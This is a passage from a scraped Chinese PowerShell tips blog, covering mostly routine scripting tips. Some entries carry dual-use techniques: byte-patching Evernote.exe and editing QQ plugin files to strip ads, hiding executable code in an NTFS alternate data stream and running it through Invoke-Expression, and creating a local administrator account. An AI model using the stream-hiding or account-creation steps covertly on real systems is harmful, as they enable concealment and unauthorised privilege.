:)脚本的思路是以二进制的方式搜索指定的模式（pattern），并替换成新的模式。涉及到一些字节操作和进制转换。 $pattern = '45004E0041006400420072006F0077007300650072004300740072006C' $replacement = $pattern -replace '.', '0' function Replace-Pattern ($buffer, $pattern, $replacement) { $isPatternMatched = $false for ($offset = 6220000; $offset -lt $buffer.Length - $pattern.Length; $offset++) { $isByteMatched = $true for ($patternOffset = 0; $patternOffset -lt $pattern.Length; $patternOffset++) { if ($buffer[$offset + $patternOffset] -ne $pattern[$patternOffset]) { $isByteMatched = $false break } } if ($isByteMatched) { $isPatternMatched = $true break } } if ($isPatternMatched) { for ($index = 0; $index -lt $pattern.Length; $index++) { $buffer[$offset + $index] = [byte]0 } return $true } else { return $false } } function Convert-HexStringToByteArray { ################################################################ #.Synopsis # Convert a string of hex data into a System.Byte[] array. An # array is always returned, even if it contains only one byte. #.Parameter String # A string containing hex data in any of a variety of formats, # including strings like the following, with or without extra # tabs, spaces, quotes or other non-hex characters: # 0x41,0x42,0x43,0x44 # x41x42x43x44 # 41-42-43-44 # 41424344 # The string can be piped into the function too. ################################################################ [CmdletBinding()] Param ( [Parameter(Mandatory = $True, ValueFromPipeline = $True)] [String] $String ) #Clean out whitespaces and any other non-hex crud. $String = $String.ToLower() -replace '[^a-f0-9\\\\\\,x\\-\\:]','' #Try to put into canonical colon-delimited format. $String = $String -replace '0x|\\\\x|\\-|,',':' #Remove beginning and ending colons, and other detritus. $String = $String -replace '^:+|:+$|x|\\\\','' #Maybe there's nothing left over to convert... if ($String.Length -eq 0) { ,@() ; return } #Split string with or without colon delimiters. if ($String.Length -eq 1) { ,@([System.Convert]::ToByte($String,16)) } elseif (($String.Length % 2 -eq 0) -and ($String.IndexOf(&quot;:&quot;) -eq -1)) { ,@($String -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}}) } elseif ($String.IndexOf(&quot;:&quot;) -ne -1) { ,@($String -split ':+' | foreach-object {[System.Convert]::ToByte($_,16)}) } else { ,@() } #The strange &quot;,@(...)&quot; syntax is needed to force the output into an #array even if there is only one element in the output (or none). } echo '本程序用于去除 Evernote 非会员左下角的正方形广告。' echo '请稍候……' $patternArray = Convert-HexStringToByteArray $pattern $replacementArray = Convert-HexStringToByteArray $replacement $path = &quot;${Env:ProgramFiles}\\Evernote\\Evernote\\Evernote.exe&quot; $path86 = &quot;${Env:ProgramFiles(x86)}\\Evernote\\Evernote\\Evernote.exe&quot; if (Test-Path $path) { $execute = Get-Item $path } elseif (Test-Path $path86) { $execute = Get-Item $path86 } else { Write-Warning '没有找到 Evernote.exe。' exit } $exe = gc $execute -ReadCount 0 -Encoding byte if (Replace-Pattern $exe $patternArray $replacementArray) { $newFileName = $execute.Name + '.bak' $newPath = Join-Path $execute.DirectoryName $newFileName Stop-Process -Name Evernote -ErrorAction SilentlyContinue Move-Item $execute $newPath Set-Content $execute -Value $exe -Encoding Byte echo '广告去除成功！Evernote 未来升级后需重新运行本程序。' Start-Process $execute } else { Write-Warning '无法去除广告，是否已经去除过了？' if (!(Get-Process -Name Evernote -ErrorAction SilentlyContinue)) { Start-Process $execute } } 您也可以从这里 下载 写好的脚本。","link":"/2014/01/18/remove-evernote-ad-with-powershell/"},{"title":"PowerShell 技能连载 - PowerShell 4.0 中隐藏的数组扩展方法","text":"PowerShell 4.0 （Windows 8.1 自带）中的数组原生支持 Foreach 和 Where 操作。这是一个 geek 的写法，所以并不见得比传统的管道有明显的优势（除了也许性能有所提升之外）。 这行代码将从一个数字列表中过滤出奇数来： @(1..10).Where({$_ % 2}) 以下代码将获取正在运行中的服务： @(Get-Service).Where({$_.Status -eq 'Running'}) 还有一些更多的（不在文档中）的东西。这行代码将获取大于 2 的前 4 个数字： @(1..10).Where({$_ -gt 2}, 'skipuntil', 4) 最后，以下代码将做类似的事情，但是将它们转换为 TimeSpan 对象： @(1..10).Where({$_ -gt 2}, 'skipuntil', 5).Foreach([Timespan])","link":"/2014/01/20/hidden-array-extensions-in-powershell-4-0/"},{"title":"PowerShell 技能连载 - 删除空结果","text":"要排除某些包含空属性值的结果，您可以简单地使用 Where-Object 命令。例如，当您运行 Get-HotFix 时，假设您只希望查看 InstalledOn 属性包含时间值的补丁，以下是解决方案： PS&gt; Get-HotFix | Where-Object InstalledOn 类似地，要从 WMI 中获取分配了 IP 地址的网络适配器，请使用以下代码： PS&gt; Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object IPAddress 请注意在 PowerShell 2.0 以及以下版本，您需要使用完整的语法，类似如下： PS&gt; Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress } Where-Object 将会排除您所选的属性包含以下任意一种情况的对象：null 值、空字符串，或者数字 0。因为这些值在转换为 Boolean 类型的时候将会被转换成 $false。","link":"/2014/01/21/eliminating-empty-results/"},{"title":"PowerShell 技能连载 - 解锁下载的文件","text":"任何从 Internet 下载的以及从邮件接收到的文件，都被 Windows 隐式地标记为不安全的。如果文件包含可执行文件或二进制文件，它们必须解锁以后才可以运行。 PowerShell 3.0 以及以上的版本可以检测到包含“下载标记”的文件： Get-ChildItem -Path $Home\\Downloads -Recurse | Get-Item -Stream Zone.Identifier -ErrorAction Ignore | Select-Object -ExpandProperty FileName | Get-Item 这段代码或许不会返回任何文件（当没有文件具有下载标记的情况下），或许会返回一大堆文件（这也许意味着您解压了一个下载的 ZIP 文件，但忘了先对它解锁）。 要解锁这些文件，请使用 Unblock-File cmdlet。这段代码将解锁您下载文件夹中当前被锁定的文件（不涉及到其它任何文件）： Get-ChildItem -Path $Home\\Downloads -Recurse | Get-Item -Stream Zone.Identifier -ErrorAction Ignore | Select-Object -ExpandProperty FileName | Get-Item | Unblock-File","link":"/2014/01/22/unblocking-download-files/"},{"title":"Microsoft Visual Studio 2013 Update 1 离线安装包下载","text":"下载信息Visual Studio 2013 Update1 官网（微软下载中心） 本次更新是适用于 Visual Studio 2013 的一系列新增功能和 Bug 修复中的最新更新。 出版日期：2014/1/17 版本：30110.00 在线安装包（1.1 MB） CRC ：AD470B9E SHA-1：D3543BFE1F0DA6D7D63760C5C3A5A7166E2B6B42 离线安装包（光盘镜像）（245 MB） CRC ：B9C46697 SHA-1：51403CAF8E5E9799ACF1F3A0DA0E46390CD2FB16","link":"/2014/01/22/visual-studio-2013-update-1-offline-package-download/"},{"title":"PowerShell 技能连载 - 启动任何版本的 Excel","text":"Microsoft Excel 是一个不那么容易直接运行的程序的例子：Excel 的路径也许是各不相同的，取决于 Office 的版本以及平台的架构（32 位或 64 位）。 PowerShell 有一个十分智能的 cmdlet 来用于运行程序：Start-Process。通常您可以以这种方式用它来运行 Excel（或其它可执行程序）： PS&gt; Start-Process -FilePath 'C:\\Program Files (x86)\\Microsoft Office\\Office14\\EXCEL.EXE' 而在您的系统中， Excel 的路径可能不同。这是为什么 Start-Process 设计成接受通配符的原因。只要将路径中所有“特定的”部分替换为一个通配符即可。 以下代码将会运行任何版本的 Excel，而不论是什么平台架构： PS&gt; Start-Process -FilePath 'C:\\Program*\\Microsoft Office\\Office*\\EXCEL.EXE'","link":"/2014/01/23/launching-any-excel-version/"},{"title":"PowerShell 技能连载 - 快速创建新的本地管理员账户","text":"是否有为了测试而创建新的本地管理员账户的经历？假设您已经以 Administrator 账户登录，并且使用管理员特权开启 PowerShell，那么增加这样一个账户只需要几行代码就可以完成： $user = 'splitpersonality' net user /add $user net localgroup Administrators /add $user 注意目标的组名是本地化的，所以在非英文系统中，您需要将 Administrators 替换成您的 Administrators 组的本地化名称。 译者注：我在中文操作系统上实验了一下，直接用 Administrators 也没有问题的。","link":"/2014/01/24/create-new-local-admin-account-on-the-fly/"},{"title":"PowerShell 技能连载 - 读写 NTFS 流","text":"当一个文件存储在 NTFS 文件系统分区时，您可以向它附加数据流来存储隐藏信息。 以下是一个将 PowerShell 代码隐藏在 NTFS 流中的例子。当您运行这段代码时，它将在您的桌面上创建一个新的 PowerShell 脚本文件，然后在 ISE 编辑器中打开这个文件： $path = &quot;$home\\Desktop\\secret.ps1&quot; $secretCode = { Write-Host -ForegroundColor Red 'This is a miracle!'; [System.Console]::Beep(4000,1000) } Set-Content -Path $path -Value '(Invoke-Expression ''[ScriptBlock]::Create((Get-Content ($MyInvocation.MyCommand.Definition) -Stream SecretStream))'').Invoke()' Set-Content -Path $path -Stream SecretStream -Value $secretCode ise $path 这个新的文件将看上去只是包含以下代码： (Invoke-Expression '[ScriptBlock]::Create((Get-Content ($MyInvocation.MyCommand.Definition) -Stream SecretStream))').Invoke() 而当您运行这个脚本文件时，它将显示一段红色的文本并且蜂鸣一秒钟。所以新创建的脚本实际上执行了嵌入在隐藏 NTFS 流中名为“SecretStream”的代码。 要向 NTFS 卷中的（任何）文件附加隐藏信息，请使用 Add-Content 或 Set-Content 命令以及 -Stream 参数。 要从一个流中读取隐藏信息，请使用 Get-Content 命令，并为 -Stream 参数指定存储数据时用的名字。","link":"/2014/01/27/reading-and-writing-ntfs-streams/"},{"title":"PowerShell 技能连载 - 根据主机名获取 DNS IP 地址","text":"有一个 GetHostByName() .NET 函数十分有用。它可以查询一个主机名并返回其当前的 IP 地址： [System.Net.DNS]::GetHostByName('someName') 通过一个简单的 PowerShell 包装，它可以转换成一个多功能的很棒的小函数： function Get-IPAddress { param ( [Parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)] [String[]] $Name ) process { $Name | ForEach-Object { try { [System.Net.DNS]::GetHostByName($_) } catch { } }} } 您现在可以直接使用这个函数（来获取您的 IP 地址）了。您可以传入一个或多个计算机名（逗号分隔）。您甚至可以通过 Get-ADComputer 或者 Get-QADComputer 管道传入数据。 Get-IPAddress Get-IPAddress -Name TobiasAir1 Get-IPAddress -Name TobiasAir1, Server12, Storage1 'TobiasAir1', 'Server12', 'Storage1' | Get-IPAddress Get-QADComputer | Get-IPAddress Get-ADComputer -Filter * | Get-IPAddress 这样做是可行的，因为这个函数包含管道绑定以及一个参数序列化器。 -Name 参数为 ForEach-Object 提供数据，所以无论用户传入多少个机器名，它们都能被正确处理。 -Name 参数既能以参数的方式，也能以值的方式从管道中接收数据。所以您可以传入任何包含“Name”属性的对象，也可以传入任何纯字符串的列表。 注意该函数有一个非常简易的错误处理器。如果您传入了一个无法解析的计算机名，那么什么事也不会发生。如果您需要处理错误信息，请在 catch 代码块中添加代码。","link":"/2014/01/28/getting-dns-ip-address-from-host-name/"},{"title":"PowerShell 技能连载 - 当发生错误时播放一段声音","text":"为了吸引用户的注意力，您的脚本可以很容易地播放 WAV 声音文件。以下是一个简单的函数： function Play-Alarm { $path = &quot;$PSScriptRoot\\Alarm06.wav&quot; $playerStart = New-Object Media.SoundPlayer $path $playerStart.Load() $playerStart.PlaySync() } 这段脚本假设 WAV 文件存放在和脚本相同的目录。请注意 PowerShell 2.0 并不支持 $PSScriptRoot。 您只需要确保设置了 $path 变量并指向一个您希望的合法的 WAV 文件即可。 缺省情况下，PowerShell 将会等待直到声音播放完。如果您希望 PowerShell 继续执行而不是等待，请将 PlaySync() 替换成 Play()。","link":"/2014/01/29/playing-a-sound-on-error/"},{"title":"PowerShell 技能连载 - Ping 主机","text":"有很多种方法可供您 ping 主机。以下是一个简单的将传统的 ping.exe 结合进您的脚本的方法： function Test-Ping { param([Parameter(ValueFromPipeline=$true)]$Name) process { $null = ping.exe $Name -n 1 -w 1000 if($LASTEXITCODE -eq 0) { $Name } } } Test-Ping 接受一个主机名或 IP 地址作为参数并且返回 ping 是否成功。通过这种方法，您可以传入一个大的主机或 IP 地址列表，然后获得在线的结果： '??','127.0.0.1','localhost','notthere',$env:COMPUTERNAME | Test-Online","link":"/2014/01/30/pinging-computers/"},{"title":"PowerShell 技能连载 - 单行内为多个变量赋值","text":"当您将某个值赋给一个变量时，您可以用括号把表达式括起来。这个表达式还将返回该数值。我们看看它的样子： $a = Get-Service ($a = Get-Service) 见到它们的区别了吗？第二行不仅将 Get-Service 的结果赋值给一个变量，而且将把结果输出至控制台。 实际上您也可以利用上第二行的结果。请看如下代码： $b = ($a = Get-Service).Name $a $b 这将把所有的服务赋值给 $a，并把所有的服务名称赋值给 $b。 再次地，您可以将这个结果再用括号括起来，以供下次继续复用这个结果： $c = ($b = ($a = Get-Service).Name).ToUpper() $a $b $c 现在 $c 将包含所有大写形式的服务名。很另类的写法。","link":"/2014/01/31/multiple-assignments-in-one-line/"},{"title":"PowerShell 技能连载 - 朗读英文和德文（以及西班牙文，或您指定的语言）","text":"Windows 8 是第一个完整支持本地化的文本到语音引擎的操作系统。所以您现在可以用 PowerShell 来朗读（以及咒骂）。 同时，操作系统永远有英文引擎，所以您的计算机拥有两种语言能力。 以下是一个用于德文系统的示例脚本（它可以很容易改为您的地域）。只需要修改语言 ID 即可（例如“de-de”代表德文），就可以让 Windows 说另一种语言。 请注意，在 Windows 8 之前，只附带了英文引擎。在 Windows 8 中，您可以使用您的本地语言。其它语言不可用。 $speaker = New-Object -ComObject SAPI.SpVoice $speaker.Voice = $speaker.GetVoices() | Where-Object { $_.ID -like '*de-de*'} $null = $speaker.Speak('Ich spreche Deutsch') $speaker.Voice = $speaker.GetVoices() | Where-Object { $_.ID -like '*en-us*'} $speaker.Speak('But I can of course also speak English.')","link":"/2014/02/03/speaking-english-and-german-and-spanish-and-you-name-it/"},{"title":"PowerShell 技能连载 - 检测合法的时间","text":"如果您想检测某个信息类似“是否是合法的日期”，以下是一个检测的函数： function Test-Date { param ( [Parameter(Mandatory=$true)] $Date ) (($Date -as [DateTime]) -ne $null) } 这段代码使用 -as 操作符尝试将输入数据转换为 DateTime 格式。如果转换失败，则结果为 $null，所以函数可以根据转换的结果返回 $true 或 $false。请注意，-as 操作符使用您的本地 DateTime 格式。","link":"/2014/02/04/testing-for-valid-date/"},{"title":"PowerShell 技能连载 - 用逗号作为十进制数分隔符","text":"也许您还没有意识到，PowerShell 在输入输出时用的是不同的十进制分隔符——这也许会导致脚本用户产生混淆。 当您输入信息时，PowerShell 接受的是语言中性的格式（使用“.”作为十进制分隔符）。当输出信息时，它使用的是您的区域设置（所以在许多国家，使用的是“,”）。 请实践一下看看以下是否和您的文化相符： $a = 1.5 $a 1,5 这是一个良好的设计，因为使用语言中性的输入格式，脚本执行情况永远相同，无论区域设置如何。然而，如果您希望用户能使用逗号作为分隔符，请看以下脚本： function Multiply-LocalNumber { param ( [Parameter(Mandatory=$true)] $Number1, $Number2 = 10 ) [Double]$Number1 = ($Number1 -join '.') [Double]$Number2 = ($Number2 -join '.') $Number1 * $Number2 } 用户可以任选一种方式运行： PS&gt; Multiply-LocalNumber 1.5 9.223 13,8345 PS&gt; Multiply-LocalNumber 1,5 9,223 13,8345 当用户选择使用逗号，PowerShell 实际上将它解释成一个数组。这是为什么脚本将数组用“.”连接的原因，实际上是将数组转换为一个数字。-join 的执行结果是一个字符串，该字符串需要被转换成一个数字，所以一切正常。 当然，这是个有点黑客的技巧，它总比每次首先得指导您的用户必须使用“.”分隔符来得好。","link":"/2014/02/05/using-comma-as-decimal-delimiter/"},{"title":"PowerShell 技能连载 - 带对话框的必选参数","text":"通常地，当您将一个函数参数标记为“必选的”，如果用户遗漏了这个参数，PowerShell 将提示用户： function Get-Something { param ( [Parameter(Mandatory=$true)] $Path ) &quot;You entered $Path&quot; } 结果如下所示： PS&gt; Get-Something cmdlet Get-Something at command pipeline position 1 Supply values for the following parameters: Path: 以下是另一种选择：如果用户遗漏了 -Path，该函数弹出一个打开文件对话框： function Get-Something { param ( $Path = $( Add-Type -AssemblyName System.Windows.Forms $dlg = New-Object -TypeName System.Windows.Forms.OpenFileDialog if ($dlg.ShowDialog() -eq 'OK') { $dlg.FileName } else { throw 'No Path submitted'} ) ) &quot;You entered $Path&quot; }","link":"/2014/02/06/mandatory-parameter-with-a-dialog/"},{"title":"PowerShell 技能连载 - 设置（及删除）环境变量","text":"PowerShell 可以很容易地读取环境变量。以下代码返回当前的 Windows 文件夹： $env:windir 然而，如果您想永久地改变用户或机器的环境变量，您需要使用 .NET 的功能。以下是一个可以快速设置或删除环境变量的简单函数： function Set-EnvironmentVariable { param ( [Parameter(Mandatory=$true, HelpMessage='Help note')] $Name, [System.EnvironmentVariableTarget] $Target, $Value = $null ) [System.Environment]::SetEnvironmentVariable($Name, $Value, $Target ) } 要创建一个永久的环境变量，试试以下代码： PS&gt; Set-EnvironmentVariable -Name TestVar -Value 123 -Target User 请注意新的用户变量只对新运行的应用程序可见。已运行的应用程序将会保持它们的运行环境副本，除非它们显式地请求改变后的变量。 以下是删除该环境变量的代码： PS&gt; Set-EnvironmentVariable -Name TestVar -Value '' -Target User","link":"/2014/02/07/setting-and-deleting-environment-variables/"},{"title":"用 PowerShell 更新 Oray 花生壳动态 IP","text":"花生壳是 oray 公司提供的 DDNS 客户端。官方的客户端庞大臃肿： 不过好在花生壳开放了基于 http 的 API。这样我们可以很容易地用 PowerShell 实现更新动态 IP 的功能： param ( $UserName = 'xxx', $Password = 'yyy', $HostName, $IP ) function Get-ExternalIP { #(Invoke-WebRequest 'http://myip.dnsomatic.com' -UseBasicParsing).Content ((Invoke-WebRequest 'http://ddns.oray.com/checkip').ParsedHtml.body.innerText -split ':')[1].Trim() } function Update-OrayDdns { param ( [parameter(Mandatory = $true)] [string]$UserName, [parameter(Mandatory = $true)] [string]$Password, [parameter(HelpMessage = '需要更新的域名，此域名必须是开通花生壳服务。多个域名使用,分隔，默认为空，则更新护照下所有激活的域名。')] [string]$HostName, [parameter(HelpMessage = '需要更新的IP地址，可以不填。如果不指定，则由服务器获取到的IP地址为准。')] [string]$IP ) $request = 'http://ddns.oray.com/ph/update?hostname={0}' -f ($HostName -join ',') if ($IP) { $request = $request + '&amp;myip=' + $IP } $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($UserName+&quot;:&quot;+$Password )) $headers = @{Authorization = &quot;Basic &quot;+$encoded} $response = Invoke-WebRequest $request -Headers $headers -UseBasicParsing $codes = @{ good = '更新成功，域名的IP地址已经更新。' nochg = '更新成功，但没有改变IP。一般这种情况为本次提交的IP跟上一次的一样。' notfqdn = '未有激活花生壳的域名。' nohost = '域名不存在或未激活花生壳。' abuse = '请求失败，频繁请求或验证失败时会出现。' '!donator' = '表示此功能需要付费用户才能使用，如https。' 911 = '系统错误' } $code = ($response.Content -split ' ')[0] $message = $codes[$code] if ($code -eq 'good' -or $code -eq 'nochg') { Write-Output $message } elseif ($code -eq 'notfqdn' -or $code -eq 'nohost') { Write-Warning $message } else { Write-Error $message } } Update-OrayDdns $UserName $Password $HostName 您也可以从这里 下载 写好的脚本。","link":"/2014/02/07/update-oray-ddns/"},{"title":"PowerShell 技能连载 - 读取注册表的可扩充字符串值","text":"当您读取一个“可扩充字符串”类型的注册表值时，它将自动展开文本中的所有环境变量值。 这个例子将从注册表中读取系统设备路径： $path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion' $key = Get-ItemProperty -Path $path $key.DevicePath 该结果将是实际的路径。这问题不大，除非您希望获取原始（未展开的）注册表值。以下是读取原始值的例子： $path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion' $key = Get-Item -Path $path $key.GetValue('DevicePath', '', 'DoNotExpandEnvironmentNames') 通过这种方式存取注册表值可以提供额外的信息：您还可以获取该值的数据类型： $path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion' $key = Get-Item -Path $path $key.GetValueKind('DevicePath')","link":"/2014/02/10/reading-stringexpand-registry-values/"},{"title":"PowerShell 技能连载 - 从 PFX 文件中导入证书","text":"您可以使用 Get-PfxCertificate 来从 PFX 文件中读取数字证书，然后用数字证书来为脚本文件签名，例如： $pfxpath = 'C:\\PathToPfxFile\\testcert.pfx' $cert = Get-PfxCertificate -FilePath $pfxpath $cert Get-ChildItem -Path c:\\myscripts -Filter *.ps1 | Set-AuthenticodeSignature -Certificate $cert 然而，Get-PfxCertificate 将会交互式地询问您导出证书至 PFX 文件时所用的密码： 要静默地导入证书，请使用这段代码： $pfxpath = 'C:\\PathToPfxFile\\testcert.pfx' $password = 'topsecret' Add-Type -AssemblyName System.Security $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 $cert.Import($pfxpath, $password, 'Exportable') $cert","link":"/2014/02/11/importing-certificates-from-pfx-files/"},{"title":"PowerShell 技能连载 - 确保向后兼容","text":"假设您创建了这个函数： function Test-Function { param ( [Parameter(Mandatory=$true)] $ServerPath ) &quot;You selected $ServerPath&quot; } 它现在可以正常工作，但是在半年之后的代码审查中，您的老板希望您使用标准的参数名称，将“ServerPath”改名为“ComputerName”。那么您对您的代码做出适当的修改： function Test-Function { param ( [Parameter(Mandatory=$true)] $ComputerName ) &quot;You selected $ComputerName&quot; } 然而，您不能很容易地控制哪些人调用了您的函数，而且他们使用了旧的参数。所以要确保向后兼容，请确保您的函数使用旧的参数名也可以工作： function Test-Function { param ( [Parameter(Mandatory=$true)] [Alias(&quot;ServerPath&quot;)] $ComputerName ) &quot;You selected $ComputerName&quot; } 旧的代码任然可以运行，并且新的代码（以及代码自动完成）将会使用新的名称：","link":"/2014/02/12/ensuring-backward-compatibility/"},{"title":"PowerShell 技能连载 - 在 Remoting 中使用完整限定名","text":"当您尝试使用 PowerShell Remoting 时，您也许会因为您使用的机器名不是完整限定名而导致连接错误。Kerberos 验证可能需要也可能不需要使用完整限定名，这取决于您的 DNS 配置。 所以也许您使用如下方式连接的时候会发生错误： Enter-PSSession -ComputerName storage1 当发生错误的时候，请向 DNS 查询完整限定名： [System.Net.Dns]::GetHostByName('storage1').HostName 然后，用查出的名字来代替主机名。如果主机启用了 Remoting 并且正确地配置了，您现在应该可以连上了。","link":"/2014/02/13/using-fully-qualified-names-in-remoting/"},{"title":"PowerShell 技能连载 - 从 PFX 文件中导入多个证书","text":"Get-PfxCertificate 可以从 PFX 文件中导入数字证书。然而，他只能获取一个证书。所以如果您的 PFX 文件中包含多个证书，您无法使用这个 cmdlet 获取其它的证书。 若要从一个 PFX 文件中导入多个证书，只要使用以下代码： $pfxpath = 'C:\\PathToPfxFile\\testcert.pfx' $password = 'topsecret' Add-Type -AssemblyName System.Security $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection $cert.Import($pfxpath, $password, 'Exportable') $cert","link":"/2014/02/14/importing-multiple-certificates-from-pfx-files/"},{"title":"PowerShell 微软虚拟学院课程","text":"快速入门 PowerShell 3.0 - 入门篇。密码 sja7 快速入门 : PowerShell 3.0 高级工具和脚本 - 提高篇。密码 djqe","link":"/2014/02/14/powershell-mva-lessons/"},{"title":"用 PowerShell 屏蔽腾讯 QQ 秀","text":"我们在 用 PowerShell 屏蔽腾讯 QQ 的广告 这篇文章中介绍过了如何屏蔽 QQ 聊天窗口的横幅广告，那么如何屏蔽 QQ 秀的广告呢？请参见 QQ2013 删除QQ秀广告。 但是其中的步骤有点繁琐。我们把整个流程用 PowerShell 写一遍，对于用户只要执行一下即可： $folder = &quot;${env:ProgramFiles}\\Tencent\\QQ\\Plugin\\Com.Tencent.QQShow\\&quot; $folder $rdbFile = Join-Path $folder 'Bundle.rdb' $rdbDir = Join-Path $folder 'Bundle' $xmlPath = Join-Path $folder 'Bundle\\I18N\\2052\\UrlBundle.xml' if (Test-Path &quot;$rdbFile.bak&quot;) { Write-Warning &quot;$rdbFile.bak 文件已存在，请确认是否已经替换？&quot; Write-Warning &quot;程序退出。&quot; return } $rdbFile .\\RDB.exe &quot;&quot;&quot;$rdbFile&quot;&quot;&quot; move $rdbFile &quot;$rdbFile.bak&quot; .\\D4QQenc.exe (Join-Path $folder 'Bundle\\I18N\\2052\\UrlBundle.xml.enc') del (Join-Path $folder 'Bundle\\I18N\\2052\\UrlBundle.xml.enc') [xml]$urlBundle = Get-Content $xmlPath -Encoding UTF8 | where { $_ -ne '' } @('IDS_QQSHOW_MARKET', 'IDS_3DSHOW_MARKET', 'IDS_FLASHSHOW_MARKET') | foreach { $id = $_ ($urlBundle.StringBundle.String | where { $_.id -eq $id }).&quot;#text&quot; = '' } $urlBundle.OuterXml | Set-Content $xmlPath -Encoding UTF8 .\\RDB.exe &quot;&quot;&quot;$rdbDir&quot;&quot;&quot; 您也可以从这里 下载 写好的脚本，祝您使用愉快。本方法在 QQ2013（SP6） 上验证通过。","link":"/2014/02/17/block-qq-show-with-powershell/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中创建干净的测试环境","text":"当您在 PowerShell ISE 编辑器中开发 PowerShell 脚本时，您需要在一个干净的环境中运行最终的测试，确保不会被之前运行时残留的变量或者函数干扰。 创建一个干净的测试环境的最简单方法是：选择文件菜单，然后选择“新建 PowerShell 选项卡”。这将为您带来一个新的标签页，并且该页代表一个全新的 PowerShell 宿主。完美的测试环境！","link":"/2014/02/17/use-fresh-testing-environment-in-powershell-ise/"},{"title":"PowerShell 技能连载 - 正确地按日期时间筛选","text":"当您使用 Where-Object 通过日期或时间来过滤信息时，它工作得很好——前提是您使用了正确的过滤格式。请不要使用输出结果中的格式。 要指定一个日期或时间，请永远使用中性文化的格式： “year-month-day hour:minute:second”，所以 2014 年 5 月 14 日应该表述成这样：“2014-05-12 12:30:00”。 或者换种方法处理：当您输出结果时，PowerShell 将根据您控制面板的设置来格式化日期和时间。当您输入信息（例如过滤规则）时，PowerShell 永远期望接收一个通用的日期和时间格式。这是有道理的：脚本须在任何文化环境中运行一致。而结果需要格式化成读者的语言文化格式。 所以要在您的 Windows 文件夹中查找所有自从 2012 年 4 月 30 日以来没有修改过的文件，请尝试以下代码：","link":"/2014/02/18/correctly-filtering-datetime/"},{"title":"PowerShell 技能连载 - 用 PowerShell 为 VBScript 文件签名","text":"您很可能知道 Set-AuthenticodeSignature 可以用来为 PowerShell 脚本签名。但您是否知道这个 cmdlet 可以为任何支持目标接口包 (SIP) 的任何文件呢？ 这段代码可以从一个 PFX 文件中读取数字证书，然后从您的 home 文件夹中扫描 VBScript 文件，然后将数字签名应用到脚本文件上： # change path to point to your PFX file: $pfxpath = 'C:\\Users\\Tobias\\Documents\\PowerShell\\testcert.pfx' # change password to the password needed to read the PFX file: # (this password was set when you exported the certificate to a PFX file) $password = 'topsecret' # load certificate Add-Type -AssemblyName System.Security $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 $cert.Import($pfxpath, $password, 'Exportable') # apply signature to all VBScript files # REMOVE -WHATIF TO ACTUALLY SIGN Get-ChildItem -Path $home -Filter *.vbs -Recurse -ErrorAction SilentlyContinue | Set-AuthenticodeSignature -Certificate $cert -WhatIf","link":"/2014/02/19/signing-vbscript-files-with-powershell/"},{"title":"PowerShell 技能连载 - 使用 $PSScriptRoot 加载资源","text":"从 PowerShell 3.0 开始，有一个称为 $PSScriptRoot 的变量可用。该变量之前只在模块中可用。它总是指向当前脚本所在的文件夹（所以它仅在您明确地保存了它以后才生效）。 您可以使用 $PSScriptRoot 来加载相对于您脚本位置的额外资源。例如，如果您打算将一些函数放在同一个文件夹中的一个独立的“library”脚本中，以下代码将加载该 library 脚本并且导入它包含的所有函数： # this loads the script &quot;library1.ps1&quot; if it is located in the very # same folder as this script. # Requires PowerShell 3.0 or better. . &quot;$PSScriptRoot\\library1.ps1&quot; 类似地，如果您希望将您的 library 脚本保存在一个子文件夹中，请试验以下脚本（假设库脚本放在您脚本所在文件夹中的“resources”子文件夹下）： # this loads the script &quot;library1.ps1&quot; if it is located in the subfolder # &quot;resources&quot; in the folder this script is in. # Requires PowerShell 3.0 or better. . &quot;$PSScriptRoot\\resources\\library1.ps1&quot;","link":"/2014/02/20/use-psscriptroot-to-load-resources/"},{"title":"PowerShell 技能连载 - 持有一个进程的句柄","text":"当您打开一个 EXE 文件时，PowerShell 将会开心地启动它，然后什么也不管： 如果您希望持有该进程的句柄，比如希望获得它的进程 ID，或者过一会儿检查该进程运行得如何，或者要中止它，请使用 Start-Process 和 –PassThru 参数。以下代码将返回一个进程对象：","link":"/2014/02/21/keeping-a-handle-to-a-process/"},{"title":"PowerShell 技能连载 - 过滤命令输出的文本","text":"比较操作符作用于数组时，它们的作用和过滤器相似。所以许多输出多行文本的控制台命令可以使用比较操作符。 以下例子将使用 netstat.exe 来获取已连接上的网络连接，然后过滤出连到名字包含“stor”的服务器的连接，最后用 ipconfig 来获取当前的 IPv4 地址： 这个技巧是将控制台命令用 @() 括起来，确保结果为一个数组。","link":"/2014/02/24/filtering-text-based-command-output/"},{"title":"PowerShell 技能连载 - 使用别名来启动 Windows 组件","text":"PowerShell 不仅是一个自动化操作的语言，而且是另一个用户操作界面。如果您不喜欢图形界面，那么练习使用 PowerShell 通过简单的别名来启动您需要的工具。 例如，要打开设备管理器，您可以使用它的原始名称： 如果您不想记忆这个名称，那么使用别名： 如您所见，要打开设备管理器，您现在所要做的只是键入“DeviceManager”。您也可以只键入“Device”然后按下 TAB 键来使用自动完成功能。 当关闭 PowerShell 时，定义的别名将会消失。所以要保持您定义的别名有效，请将 Set-Alias 命令加入您的配置脚本。配置脚本的路径可以在 $profile 中找到。如果这个目录不存在，您可能需要事先创建这个文件（以及它所在的文件夹）。Test-Path 可以检测它是否已经存在。","link":"/2014/02/25/using-aliases-to-launch-windows-components/"},{"title":"PowerShell 技能连载 - 展开字符串中的变量","text":"要在一个字符串中插入一个变量，您也许已经知道可以使用如下的双引号方式： $domain = $env:USERDOMAIN $username = $env:USERNAME &quot;$domain\\$username&quot; 对于 PowerShell 来说这些变量的起止范围是没有歧义的。所以它可以工作正常。然而试试以下代码： $domain = $env:USERDOMAIN $username = $env:USERNAME &quot;$username: located in domain $domain&quot; 这段代码执行失败了，这是因为 PowerShell 在变量中添加了冒号（从语法彩色中也可以看出）。 您可以采用 PowerShell 